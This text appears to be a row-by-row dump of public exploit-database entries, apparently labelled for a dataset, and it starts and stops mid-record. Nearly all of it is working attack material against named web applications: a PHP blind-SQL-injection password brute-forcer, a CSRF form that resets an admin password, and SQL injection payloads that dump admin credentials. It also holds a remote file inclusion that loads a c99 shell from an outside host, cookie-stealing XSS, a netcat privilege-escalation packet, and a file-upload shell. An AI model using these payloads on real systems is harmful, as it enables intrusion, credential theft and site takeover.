$pwd = ""password=asd""; 	$sub = ""loginsubmit=loginsubmit&loginsubmit=Login""; 	$str = ""{$usr}&{$pwd}&{$sub}""; 	$post = ""POST {$path}/frontpage.php HTTP/1.1\r\n"". 		""Host: {$hostname}\r\n"". 		""Connection: Close\r\n"". 		""Content-Type: application/x-www-form-urlencoded\r\n"". 		""Content-Length: "" . strlen ($str) . ""\r\n\r\n"". 		$str; 	 	fputs ($fp, $post); 	$a =  time (); 	while (!feof ($fp)) 		$res .= fgets ($fp, 1024);  	$b =  time (); 	fclose ($fp);  	if ($b - $a > 4) 		return true; 	else 		return false; }   function brute ($hostname, $path, $field, $key) { 	$pos = 1; 	$chr = 0; 	while ($chr < strlen ($key)) 	{ 		if (check ($hostname, $path, $field, $pos, $key [$chr])) 		{ 			echo $key [$chr]; 			$chr = -1; 			$pos++; 		} 		$chr++; 	} }   if (count ($argv) != 3) 	usage ();  $hostname = $argv [1]; $path = $argv [2]; $key = $argv [3]; if (empty ($key)) 	$key = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"";  echo ""[+] Username: ""; brute ($hostname, $path, ""username"", $key); echo ""\n[+] Password: ""; brute ($hostname, $path, ""password"", $key); echo ""\n"";  ?>  # milw0rm.com [2009-01-06]","[""'FrontPage.php'""]",1
8876,"Web Directory PRO - 'Admins.php' Change Admin Password <title> change password Web Directory PRO</title>       <body bgcolor=""#FF0000"">    <form method=post action=http://demo-web-directory-pro.phpwebdirectoryscript.com/admin/admins.php?sact=modify&pr=2>   <br><br>   <table>   <tr><td><center><b>MODIFY</td></tr>   <tr><td>Login</td><td><input type=text name=login value='tiger.dz'></td></tr>   <tr><td>Password</td><td><input type=text name=password value=''></td></tr>   <tr><td>Type</td><td><select name=type><option value=1 >Subadmin<option value=0 selected >Admin</select></td></tr>   <tr>   <td>Categories</td>   <td>   <select name='cats[]' multiple style='width:200px'><option value=""1"" >Art</option><option value=""2"" >Business</option><option value=""3"" >Computers</option><option value=""4"" >Games</option><option value=""5"" >Health & Fitness</option><option value=""6"" >News</option><option value=""7"" >Sports</option><option value=""8"" >Recreation</option><option value=""9"" >Internet</option><option value=""10"" >Teen & Kids</option><option value=""11"" >Reference</option><option value=""12"" >Education</option><option value=""13"" >Regional</option><option value=""14"" >Society</option><option value=""15"" >Science</option><option value=""16"" >Home & Family</option><option value=""17"" >World</option><option value=""18"" >Shopping</option><option value=""19"" >Web Hosting</option><option value=""20"" >Dedicated Servers</option><option value=""21"" >ISP</option><option value=""22"" >Hardware</option><option value=""23"" >Software</option><option value=""24"" >Security</option><option value=""25"" >Movies</option><option value=""26"" >Television</option><option value=""27"" >Music</option><option value=""28"" >Jobs</option><option value=""29"" >Investing</option><option value=""30"" >Real Estate</option><option value=""31"" >Video Games</option><option value=""32"" >Gambling</option><option value=""33"" >Board Games</option><option value=""34"" >Basketball</option><option value=""35"" >Football</option><option value=""36"" >Baseball</option><option value=""37"" >Outdoors</option><option value=""38"" >Humor</option><option value=""39"" >Travel</option><option value=""41"" >Health Care</option><option value=""42"" >Pharmacy</option><option value=""43"" >Men's Health</option><option value=""48"" >Religion</option><option value=""45"" >Newspapers</option><option value=""46"" >Magazines</option><option value=""47"" >TV Media</option><option value=""49"" >Crime</option><option value=""50"" >Sexuality</option><option value=""52"" >Pre-school</option><option value=""53"" >Teen Life</option><option value=""54"" >Sports & Games</option><option value=""55"" >Dictionaries</option><option value=""56"" >Phone Numbers</option><option value=""57"" >Maps</option><option value=""58"" >Colleges</option><option value=""59"" >Libraries</option><option value=""60"" >Distance Learning</option><option value=""65"" >Biology</option><option value=""64"" >Psychology</option><option value=""66"" >Physics</option><option value=""67"" >United States</option><option value=""68"" >Canada</option><option value=""69"" >Europe</option><option value=""70"" >Consumers</option><option value=""71"" >Home Improvement</option><option value=""72"" >Cooking</option><option value=""73"" >Fran?ais</option><option value=""74"" >Espa?ol</option><option value=""75"" >Italiano</option><option value=""76"" >Clothing</option><option value=""77"" >Autos</option><option value=""78"" >Gifts</option><option value=""79"" >Broadband</option><option value=""80"" >Dialup</option><option value=""81"" >Wireless Internet</option><option value=""82"" >Wholesale Dialup</option><option value=""83"" >Web Design</option><option value=""84"" >Web Programming</option><option value=""85"" >Directories</option><option value=""86"" >Directories</option><option value=""87"" >Free Web Hosting</option><option value=""88"" >Image Hosting</option><option value=""90"" >Search Engines</option><option value=""91"" >Web Directories</option><option value=""92"" >Comics</option><option value=""93"" >Online Writing</option><option value=""94"" >Visual Arts</option><option value=""95"" >Dance</option><option value=""96"" >Illustration</option><option value=""97"" >Entertainment</option><option value=""98"" >Design</option><option value=""99"" >Literature</option><option value=""100"" >Photography</option><option value=""101"" >Video</option><option value=""102"" >Digital</option><option value=""103"" >Humanities</option><option value=""104"" >Craft</option><option value=""105"" >Antiques</option><option value=""106"" >Architecture</option><option value=""107"" >Bodyart</option><option value=""108"" >Graphic Design</option><option value=""109"" >Art History</option><option value=""110"" >Animation</option><option value=""552"" >movies2</option><option value=""113"" >Online</option><option value=""114"" >Card Games</option><option value=""115"" >Computer Games</option><option value=""116"" >Party Games</option><option value=""117"" >Roleplaying</option><option value=""118"" >Accounting</option><option value=""119"" >E-Commerce</option><option value=""120"" >Education & Training</option><option value=""121"" >Human Resources</option><option value=""122"" >Marketing & Advertising</option><option value=""123"" >Small Business</option><option value=""124"" >Management</option><option value=""125"" >Employment</option><option value=""126"" >Customer Service</option><option value=""127"" >Health Care</option><option value=""128"" >Hospitality</option><option value=""129"" >Automotive</option><option value=""130"" >Pharmaceuticals</option><option value=""131"" >Food</option><option value=""132"" >Consumer Goods</option><option value=""133"" >Chemicals</option><option value=""134"" >Agriculture</option><option value=""135"" >Financial Services</option><option value=""136"" >Telecommunications</option><option value=""137"" >Transportation</option><option value=""138"" >Retail Trade</option><option value=""139"" >Information Technology</option><option value=""140"" >Mining & Drilling</option><option value=""141"" >Construction & Maintenance</option><option value=""142"" >Electronics & Electrical</option><option value=""143"" >Arts & Entertainment</option><option value=""144"" >Publishing & Printing</option><option value=""145"" >Textiles</option><option value=""146"" >Aeropace & Defense</option><option value=""147"" >Systems</option><option value=""148"" >Hacking</option><option value=""149"" >Desktop Publishing</option><option value=""150"" >Data Formats</option><option value=""151"" >Graphics</option><option value=""152"" >Open Source</option><option value=""153"" >Operating Systems</option><option value=""154"" >Programming</option><option value=""155"" >Games</option><option value=""156"" >Fonts</option><option value=""157"" >Virtual Reality</option><option value=""158"" >Artificial Intelligence</option><option value=""159"" >Alogrithms</option><option value=""160"" >Robotics</option><option value=""161"" >Internet Marketing</option><option value=""162"" >Proxy & Filtering</option><option value=""163"" >Online Learning</option><option value=""164"" >Routers & Routing</option><option value=""165"" >Domain Names</option><option value=""166"" >ASP</option><option value=""167"" >Perl</option><option value=""168"" >ASP.NET</option><option value=""169"" >PHP</option><option value=""170"" >VBScript</option><option value=""171"" >Java Applets</option><option value=""172"" >Javascript</option><option value=""173"" >Java Server Side</option><option value=""174"" >C++</option><option value=""175"" >Miva</option><option value=""176"" >Python</option><option value=""177"" >REBOL</option><option value=""178"" >DHTML</option><option value=""179"" >Curl</option><option value=""180"" >Mental Health</option><option value=""181"" >Alternative</option><option value=""182"" >Child Health</option><option value=""183"" >Employment</option><option value=""184"" >Home Health</option><option value=""185"" >Pharmacy</option><option value=""186"" >Publications</option><option value=""187"" >Senior Health</option><option value=""188"" >Support Groups</option><option value=""189"" >Weight Loss</option><option value=""190"" >Disabilities</option><option value=""191"" >Resources</option><option value=""192"" >Public Health & Saftey</option><option value=""193"" >Substances</option><option value=""194"" >Womens Health</option><option value=""195"" >News & Media</option><option value=""196"" >Nursing</option><option value=""197"" >Work Health & Safety</option><option value=""198"" >Travel Health</option><option value=""199"" >Dentistry</option><option value=""200"" >Senses</option><option value=""201"" >Teen Health</option><option value=""202"" >Professions</option><option value=""203"" >Nutrition</option><option value=""204"" >Insurance</option><option value=""205"" >Online Archives</option><option value=""206"" >Magazines</option><option value=""207"" >Ezines</option><option value=""208"" >Directories</option><option value=""209"" >Internet Broadcasts</option><option value=""210"" >Reviews & Opinions</option><option value=""211"" >Breaking News</option><option value=""212"" >Politics</option><option value=""213"" >Journalism</option><option value=""214"" >Weather</option><option value=""215"" >Sports</option><option value=""216"" >Current Events</option><option value=""217"" >Colleges & Universities</option><option value=""218"" >Soccer</option><option value=""219"" >Softball</option><option value=""220"" >Horse Racing</option><option value=""221"" >Software</option><option value=""222"" >Disabled</option><option value=""223"" >Fantasy</option><option value=""224"" >Events</option><option value=""225"" >Resources</option><option value=""226"" >Shopping</option><option value=""227"" >College & University</option><option value=""228"" >Resources</option><option value=""229"" >Equestrian</option><option value=""230"" >Cheerleading</option><option value=""231"" >Rugby</option><option value=""232"" >Tennis</option><option value=""233"" >Table Tennis</option><option value=""234"" >Cycling</option><option value=""235"" >Extreme Sports</option><option value=""236"" >Netball</option><option value=""237"" >Running</option><option value=""238"" >Track & Field</option><option value=""239"" >Golf</option><option value=""240"" >Gymnastics</option><option value=""241"" >Cricket</option><option value=""242"" >Boxing</option><option value=""243"" >Billiards</option><option value=""244"" >Darts</option><option value=""245"" >Badminton</option><option value=""246"" >Archery</option><option value=""247"" >Motorsports</option><option value=""248"" >Rodeo</option><option value=""249"" >Skating</option><option value=""250"" >Hockey</option><option value=""251"" >Strength Sports</option><option value=""252"" >Walking</option><option value=""253"" >Volleyball</option><option value=""254"" >Winter Sports</option><option value=""255"" >Wrestling</option><option value=""256"" >Fencing</option><option value=""257"" >Fishing</option><option value=""258"" >Antiques</option><option value=""259"" >Auto</option><option value=""260"" >Camps</option><option value=""261"" >Crafts</option><option value=""262"" >Horoscopes</option><option value=""263"" >Travel</option><option value=""264"" >Motorcycles</option><option value=""265"" >Models</option><option value=""266"" >Theme Parks</option><option value=""267"" >Trains & RailRoads</option><option value=""268"" >Guns</option><option value=""269"" >Boating</option><option value=""270"" >Bowling</option><option value=""271"" >Climbing</option><option value=""272"" >Birding</option><option value=""273"" >Aviation</option><option value=""274"" >Gardens</option><option value=""275"" >Genealogy</option><option value=""276"" >Outdoors</option><option value=""277"" >Pets</option><option value=""278"" >Scouting</option><option value=""279"" >Collecting</option><option value=""280"" >Food</option><option value=""281"" >Radio</option><option value=""282"" >Martial Arts</option><option value=""283"" >Computers</option><option value=""284"" >Health</option><option value=""285"" >School</option><option value=""286"" >People & Society</option><option value=""287"" >Family</option><option value=""288"" >Entertainment</option><option value=""289"" >Arts</option><option value=""290"" >Directories</option><option value=""291"" >Libraries</option><option value=""292"" >Museums</option><option value=""293"" >Encyclopedias</option><option value=""294"" >Bibliography</option><option value=""295"" >Almanacs</option><option value=""296"" >Directories</option><option value=""297"" >Flags</option><option value=""298"" >Time</option><option value=""299"" >Geography</option><option value=""300"" >World Records</option><option value=""301"" >Quotations</option><option value=""302"" >Questions & Answers</option><option value=""303"" >Expert Answers</option><option value=""304"" >Books</option><option value=""305"" >Biography</option><option value=""306"" >Archives</option><option value=""307"" >Early Childhood</option><option value=""308"" >Home Schooling</option><option value=""309"" >Alumni Directories</option><option value=""310"" >Methods & Theories</option><option value=""311"" >Products & Services</option><option value=""312"" >International</option><option value=""313"" >Employment</option><option value=""314"" >Special Education</option><option value=""315"" >Educators</option><option value=""316"" >Organizations</option><option value=""317"" >Subjects</option><option value=""318"" >History Of Education</option><option value=""319"" >Caribbean</option><option value=""320"" >Asia</option><option value=""321"" >Central America</option><option value=""322"" >Middle East</option><option value=""323"" >North America</option><option value=""324"" >Oceania</option><option value=""325"" >Polar Regions</option><option value=""326"" >South America</option><option value=""327"" >Africa</option><option value=""328"" >Death</option><option value=""329"" >Future</option><option value=""330"" >Philanthropy</option><option value=""331"" >Philosophy</option><option value=""332"" >Government</option><option value=""333"" >History</option><option value=""334"" >Issues</option><option value=""335"" >Law</option><option value=""336"" >Holidays</option><option value=""337"" >Lifestyle Choices</option><option value=""338"" >Politics</option><option value=""339"" >Sociology</option><option value=""340"" >Women</option><option value=""341"" >Relationships</option><option value=""342"" >Language & Linguistics</option><option value=""343"" >Genealogy</option><option value=""344"" >Ethnicity</option><option value=""345"" >Economics</option><option value=""346"" >Disabled</option><option value=""347"" >Gay, Lesbian, Bisexual</option><option value=""348"" >Social Sciences</option><option value=""349"" >Men</option><option value=""350"" >Military</option><option value=""351"" >People</option><option value=""352"" >Transgendered</option><option value=""353"" >Directories</option><option value=""354"" >Employment</option><option value=""355"" >Publications</option><option value=""356"" >Software</option><option value=""357"" >Institutions</option><option value=""358"" >Reference</option><option value=""359"" >Methods & Techniques</option><option value=""360"" >Agriculture</option><option value=""361"" >Astronomy</option><option value=""362"" >Chemistry</option><option value=""363"" >Earth Sciences</option><option value=""364"" >Environment</option><option value=""365"" >Math</option><option value=""366"" >Social Sciences</option><option value=""367"" >Technology</option><option value=""368"" >Science History</option><option value=""369"" >Alternative Science</option><option value=""370"" >Museums</option><option value=""371"" >Science In Society</option><option value=""372"" >Personal Finance</option><option value=""373"" >Rural Living</option><option value=""374"" >How To (Do It Yourself)</option><option value=""375"" >Emergencies</option><option value=""376"" >Gardens</option><option value=""377"" >Moving & Relocation</option><option value=""378"" >Homemaking</option><option value=""379"" >Homeowners</option><option value=""380"" >Afrikaans</option><option value=""381"" >Arabic </option><option value=""382"" >Armenian</option><option value=""383"" >Azerbaijani</option><option value=""384"" >Bable</option><option value=""385"" >Bahasa Melayu</option><option value=""386"" >Bangla</option><option value=""387"" >Belarusian</option><option value=""388"" >Bosanski</option><option value=""389"" >Brezhoneg</option><option value=""390"" >Bulgarian</option><option value=""391"" >Catal</option><option value=""392"" >&#268;esky</option><option value=""393"" >Chinese Simplified</option><option value=""394"" >Chinese Traditional</option><option value=""395"" >Cymraeg</option><option value=""396"" >Dansk</option><option value=""397"" >Eesti </option><option value=""398"" >Esperanto</option><option value=""399"" >Euskara</option><option value=""400"" >Faroese</option><option value=""401"" >Farsi</option><option value=""402"" >Frysk</option><option value=""403"" >Gaeilge</option><option value=""404"" >G?idhlig</option><option value=""405"" >Galego</option><option value=""406"" >Greek</option><option value=""407"" >Hebrew</option><option value=""408"" >Hindi </option><option value=""409"" >Hrvatski</option><option value=""410"" >Indonesia</option><option value=""411"" >Interlingua </option><option value=""412"" >?slenska</option><option value=""413"" >Japanese</option><option value=""414"" >Kannada </option><option value=""415"" >Kasz?bsczi </option><option value=""416"" >Kiswahili</option><option value=""417"" >Korean</option><option value=""418"" >Kurd</option><option value=""419"" >Latvian</option><option value=""420"" >L?tzebuergesch</option><option value=""421"" >Lietuvi&#371; </option><option value=""422"" >Lingua Latina</option><option value=""423"" >Magyar</option><option value=""424"" >Makedonski</option><option value=""425"" >Marathi</option><option value=""426"" >Nederlands</option><option value=""427"" >Norsk</option><option value=""428"" >Occitan</option><option value=""429"" >Polska</option><option value=""430"" >Portugu</option><option value=""431"" >Punjabi</option><option value=""432"" >Rom?n&#259;</option><option value=""433"" >Rumantsch</option><option value=""434"" >Russian</option><option value=""435"" >Sardu</option><option value=""436"" >Shqip</option><option value=""437"" >Slovensko</option><option value=""438"" >Slovensky</option><option value=""439"" >Srpski</option><option value=""440"" >Suomi</option><option value=""441"" >Svenska</option><option value=""442"" >Tagalog</option><option value=""443"" >Taiwanese</option><option value=""444"" >Tamil</option><option value=""445"" >Tatar</option><option value=""446"" >Telugu</option><option value=""447"" >Thai</option><option value=""448"" >T?rk</option><option value=""449"" >Ukrainian</option><option value=""450"" >Vietnamese</option><option value=""451"" >Auctions</option><option value=""452"" >Home & Garden</option><option value=""453"" >Classifieds</option><option value=""454"" >Directories</option><option value=""455"" >Antiques & Collectibles</option><option value=""456"" >Books</option><option value=""457"" >Children</option><option value=""458"" >Consumer Electronics</option><option value=""459"" >Crafts</option><option value=""460"" >Death Care</option><option value=""461"" >Education</option><option value=""462"" >Entertainment</option><option value=""463"" >Ethnic & Regional</option><option value=""464"" >Flowers</option><option value=""465"" >Food</option><option value=""466"" >Furniture</option><option value=""468"" >Health</option><option value=""469"" >Jewelry</option><option value=""470"" >Music</option><option value=""471"" >Niche</option><option value=""472"" >Office Products</option><option value=""473"" >Pets</option><option value=""474"" >Photography</option><option value=""475"" >Magazines & Publications</option><option value=""476"" >Recreation</option><option value=""477"" >Sports</option><option value=""478"" >Tobacco</option><option value=""479"" >Tools</option><option value=""480"" >Games & Toys</option><option value=""481"" >Travel</option><option value=""482"" >Vehicles</option><option value=""483"" >Visual Arts</option><option value=""484"" >Weddings</option><option value=""485"" >Wholesale</option><option value=""486"" >Golfers</option><option value=""487"" >Tiger Woods</option><option value=""488"" >Phil Mickelson</option><option value=""489"" >Jack Nicklaus</option><option value=""490"" >Vijay Singh</option><option value=""491"" >NBA Basketball</option><option value=""534"" >NBA Players</option><option value=""504"" >NBA Teams</option><option value=""494"" >Legends</option><option value=""495"" >Michael Jordan</option><option value=""496"" >Magic Johnson</option><option value=""497"" >Larry Bird</option><option value=""498"" >Wilt Chamberlain</option><option value=""499"" >Bill Russell</option><option value=""500"" >Kareem Abdul-Jabbar</option><option value=""501"" >Isiah Thomas</option><option value=""502"" >Lenny Wilkens</option><option value=""503"" >Jerry West</option><option value=""505"" >Atlanta Hawks</option><option value=""506"" >Boston Celtics</option><option value=""507"" >Chicago Bulls</option><option value=""508"" >Cleveland Cavaliers</option><option value=""509"" >Dallas Mavericks</option><option value=""510"" >Denver Nuggets</option><option value=""511"" >Detroit Pistons</option><option value=""512"" >Golden State Warriors</option><option value=""513"" >Houston Rockets</option><option value=""514"" >Indiana Pacers</option><option value=""515"" >Los Angeles Clippers</option><option value=""516"" >Los Angeles Lakers</option><option value=""517"" >Memphis Grizzlies</option><option value=""518"" >Miami Heat</option><option value=""519"" >Milwaukee Bucks</option><option value=""520"" >Minnesota Timberwolves</option><option value=""521"" >New Jersey Nets</option><option value=""522"" >New Orleans Hornets</option><option value=""523"" >New York Knicks</option><option value=""524"" >Orlando Magic</option><option value=""525"" >Philadelphia 76ers</option><option value=""526"" >Phoenix Suns</option><option value=""527"" >Portland Trail Blazers</option><option value=""528"" >Sacramento Kings</option><option value=""529"" >San Antonio Spurs</option><option value=""530"" >Seattle SuperSonics</option><option value=""531"" >Toronto Raptors</option><option value=""532"" >Utah Jazz </option><option value=""533"" >Washington Wizards</option><option value=""535"" >Scottie Pippen</option><option value=""537"" >Online Universities</option><option value=""538"" >Accessories</option><option value=""539"" >Athletic</option><option value=""540"" >Women's</option><option value=""541"" >Men's</option><option value=""542"" >Outwear</option><option value=""543"" >Leather</option><option value=""544"" >Casual</option><option value=""545"" >Formal</option><option value=""548"" >Used</option><option value=""547"" >Fur</option><option value=""549"" >Sleepwear</option><option value=""550"" >Undergarments</option><option value=""551"" >stuff</option><option value=""553"" >cat</option><option value=""554"" >Doggy</option>   </select>   </td>   </tr>   <tr bgcolor=white><td colspan=2><center><input type=submit value='submit'></td></tr>   </table></form>   </body>   <p><font color=""#FFFFFF"" size=""5"">CoD3d By :TiGeR-Dz</font></p>   <p><font color=""#FFFFFF"" size=""5"">E-mail : tiger.dz@live.com</font></p>   <p><font size=""5"" color=""#FFFFFF"">script:Web Directory PRO</font></p>   <p><font size=""5"" color=""#FFFFFF"">Home:http://www.phpwebdirectoryscript.com/</font></p>  </html>  # milw0rm.com [2009-06-04]","[""'Admins.php'""]",1
43305,"Entrepreneur Bus Booking Script 3.0.4 - 'sourcebus' SQL Injection # # # # #  # Exploit Title: Entrepreneur Bus Booking Script 3.0.4 - SQL Injection # Dork: N/A # Date: 10.12.2017 # Vendor Homepage: https://www.phpscriptsmall.com/ # Software Link: https://www.phpscriptsmall.com/product/entrepreneur-bus-booking-script/ # Version: 3.0.4 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/booker_details.php?sourcebus=[SQL] #  # -1++/*!09999UNION*/+/*!09999SELECT*/+(/*!09999Select*/+export_set(5,@:=0,(/*!09999select*/+count(*)/*!09999from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!09999table_name*/,0x3c6c693e,2),/*!09999column_name*/,0xa3a,2)),@,2))--+- #  # -1++/*!09999UNION*/+/*!09999SELECT*/+(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)/*!50000FROM*/(adminlogin)/*!50000WHERE*/(@x)IN(@x:=/*!50000CONCAT*/(0x20,@x,0x3c62723e555345524e414d453a,admin_username,0x3c62723e504153533a,admin_password,0x3c62723e564552204159415249,0x3c62723e))))x)--+- #  #  # # # # #","[""'sourcebus'""]",1
5393,"Dragoon 0.1 - 'root' Remote File Inclusion -==========================================[ ViVa YeMeN ]====================================-  # Name : Dragoon 0.1 Remote File Include Vulnerabilitiy  # Download From : http://sourceforge.net/project/showfiles.php?group_id=118780  # Found By : RoMaNcYxHaCkEr     [RoMaNTiC-TeaM]  ( BlackxHat , BlackBox , aLwHEeD )          # Home Page :  WwW.4RxH.CoM     +======================================================================================================================+  # Vulne Code In File header.inc.php In Line 23 :  @include($root.'config.php')){  # Exploit :  http://WwW.4RxH.CoM/PHP/includes/header.inc.php?root=http://rxh.freehostia.com/shells/c99in.txt?  That,s It,s  Good Luck Everybody  +=======================================================================================================================+  # Greet To :  Tryag TeaM & All Members Of My Forum  # For Contact : RxH@HoTMaiL.iT  # Fuck Own Life  :(   -==========================================[ ViVa YeMeN ]====================================-  # milw0rm.com [2008-04-07]","[""'root'""]",1
34057,wsCMS - 'news.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/40447/info  wsCMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/news.php?id=<script><font color=red size=15>XSS</font></script>,"[""'news.php'""]",1
23743,"Platform Load Sharing Facility 4/5/6 - 'EAuth' Local Privilege Escalation source: https://www.securityfocus.com/bid/9724/info  Load Sharing Facility eauth component has been reported prone to privilege escalation vulnerability. The eauth component is responsible for controlling authentication procedures within Load Sharing Facility. An issue has been reported where an attacker may send commands to Load Sharing Facility as any user. The issue presents itself because eauth uses an environment variable to determine the UID of the user invoking the binary.  $cat /etc/passwd|grep cadence cadence:x:500:500:Tomasz Grabowski:/home/cadence:/bin/bash $ export LSF_EAUTH_UID=500 $ eauth -c hostname ,',0/%+-$%$&&,/)  Now, she needs to send packets. She can do it, for the sake of simplicity, using Perl and NetCat software:  ( # first packet perl -e 'print ""\x04\x00\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x00""; print ""\x00\x00\x00\x00""; ' sleep 1;  #let's call it a header, packet length perl -e 'print ""\x00\x04\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x40""; #below we provide UID, GID and length of user name print ""\x00\x00\x00\x00\x00\x00\x03\xee\x00\x00\x03\xee\x00\x00\x00\x07""; #below is the user name, end indicator, and probably auth data field length print ""\x63\x61\x64\x65\x6e\x63\x65\x00\x00\x00\x00\x03\x00\x00\x00\x10""; #again authentication length and auth data itself print ""\x00\x00\x00\x10\x2a\x30\x26\x24\x21\x25\x2e\x23\x2c\x23\x27\x2d""; #rest of auth data, end indicator, question code (x09 - bkill) and process number print ""\x2f\x28\x2b\x25\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00\x77""; print ""\x00\x00\x00\x00""; ' #send it to the target daemon ) | nc 192.168.10.106 6881","[""'EAuth'""]",1
38768,"WordPress Plugin RokMicroNews - 'thumb.php' Multiple Vulnerabilities source: https://www.securityfocus.com/bid/62513/info  The RokMicroNews plugin for WordPress is prone to multiple security vulnerabilities, including:  1. An information-disclosure vulnerability 2. A cross-site scripting vulnerability 3. An arbitrary file-upload vulnerability 4. A denial-of-service vulnerability  Attackers can exploit these issues to obtain sensitive information, upload arbitrary files, perform a denial-of-service attack, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg  http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://  http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://www.example1.com/big_file&h=1&w=1  http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://www.example2.com/shell.php","[""'thumb.php'""]",1
36160,"phpBugTracker 1.6.0 - Multiple Vulnerabilities Advisory: Multiple SQLi, stored/reflecting XSS- and CSRF-vulnerabilities in phpBugTracker v.1.6.0 Advisory ID: SROEADV-2015-16 Author: Steffen Rösemann Affected Software: phpBugTracker v.1.6.0 Vendor URL: https://github.com/a-v-k/phpBugTracker Vendor Status: patched CVE-ID: will asked to be assigned after release on FullDisclosure via OSS-list Tested on: OS X 10.10 with Firefox 35.0.1 ; Kali Linux 3.18, Iceweasel 31  ========================== Vulnerability Description: ==========================  The Issuetracker phpBugTracker v. 1.6.0 suffers from multiple SQLi-, stored/reflected XSS- and CSRF-vulnerabilities.  ================== Technical Details: ==================  The following files used in a common phpBugTracker installation suffer from different SQLi-, stored/reflected XSS- and CSRF-vulnerabilities:  =========== project.php ===========  SQL injection / underlaying CSRF vulnerability  in project.php via id parameter:  http:// {TARGET}/admin/project.php?op=edit_component&id=1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+  Stored XSS via input field ""project name"":  http://{TARGET}/admin/project.php?op=add  executed in: e.g. http://{TARGET}/admin/project.php, http:// {TARGET}/index.php   ======== user.php ========  Reflecting XSS in user.php via use_js parameter:  http:// {TARGET}/admin/user.php?op=edit&use_js=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&user_id=1  executed in: same page   ========= group.php =========  Reflecting XSS in group.php via use_js parameter:  http:// {TARGET}/admin/group.php?op=edit&use_js=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&group_id=1  executed in: same page  (Blind) SQL Injection / underlaying CSRF vulnerability  in group.php via group_id parameter (used in different operations):  http:// {TARGET}/admin/group.php?op=edit&use_js=1&group_id=1+and+SLEEP%2810%29+--+ http:// {TARGET}/admin/group.php?op=edit-role&use_js=1&group_id=8+and+substring%28version%28%29,1,1%29=5+--+   ========== status.php ==========  SQL injection / underlaying CSRF vulnerability  in status.php via status_id parameter:  http:// {TARGET}/admin/status.php?op=edit&status_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+  Stored XSS via input field ""Description"":  http://{TARGET}/admin/status.php?op=edit&use_js=1&status_id=0  executed in: e.g. http://{TARGET}/admin/status.php  CSRF vulnerability in status.php (delete statuses):  <img src=""http://{TARGET}/admin/status.php?op=del&status_id={NUMERIC_STATUS_ID}""    ============== resolution.php ==============  SQL injection / underlaying CSRF vulnerability  in resolution.php via resolution_id parameter:  http:// {TARGET}/admin/resolution.php?op=edit&resolution_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+  CSRF vulnerability in resolution.php (delete resolutions):  <img src=""http://{TARGET}/admin/resolution.php?op=del&resolution_id={NUMERIC_RESOLUTION_ID}""    ============ severity.php ============  SQL injection / underlaying CSRF vulnerability  in severity.php via severity_id parameter:  http:// {TARGET}/admin/severity.php?op=edit&severity_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+  CSRF vulnerability in severity.php (delete severities):  <img src=""http://{TARGET}/admin/severity.php?op=del&severity_id={NUMERIC_SEVERITY_ID}""   Stored XSS in severity.php via input field ""Description"":  http://{TARGET}/admin/severity.php?op=edit&use_js=1&severity_id=0  executed in: e.g. http://{TARGET}/admin/severity.php   ============ priority.php ============  SQL injection / underlaying CSRF vulnerability in priority.php via priority_id parameter:  http:// {TARGET}/admin/priority.php?op=edit&priority_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,4,version%28%29+--+   ====== os.php ======  SQL Injection / underlaying CSRF vulnerability in os.php via os_id parameter:  http:// {TARGET}/admin/os.php?op=edit&os_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+  CSRF vulnerability in os.php (delete operating systems):  <img src=""http://{TARGET}/admin/os.php?op=del&os_id={NUMERIC_OS_ID}"" >  Stored XSS vulnerability in os.php via input field ""Regex"":  http://{TARGET}/admin/os.php?op=edit&use_js=1&os_id=0  executed in: e.g. http://{TARGET}/admin/os.php?   ============ database.php ============  SQL injection / underlaying CSRF vulnerability in database.php via database_id:  http:// {TARGET}/admin/database.php?op=edit&database_id=1%27+and+1=2+union+select+1,user%28%29,version%28%29+--+  CSRF vulnerability in database.php (delete databases):  <img src=""http://{TARGET}/admin/database.php?op=del&database_id={NUMERIC_DATABASE_ID}""   Stored XSS vulnerability in database.php via input field ""Name"":  http://{TARGET}/admin/database.php?op=edit&use_js=1&database_id=0   ======== site.php ========  CSRF vulnerability in site.php (delete sites):  <img src=""http://{TARGET}/admin/site.php?op=del&site_id={NUMERIC_SITE_ID}"" >  SQL injection / underlaying CSRF vulnerability in site.php via site_id parameter:  http:// {TARGET}/admin/site.php?op=edit&site_id=5%27+and+1=2+union+select+1,version%28%29,database%28%29+--+   ======= bug.php =======  This issue has already been assigned CVE-2004-1519, but seems to have not been corrected since the assignment:  SQL injection / underlaying CSRF vulnerability in bug.php via project parameter:  http:// {TARGET}/bug.php?op=add&project=1%27+and+1=2+union+select+user%28%29+--+  For details see http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1519.    ========= Solution: =========  Update to version 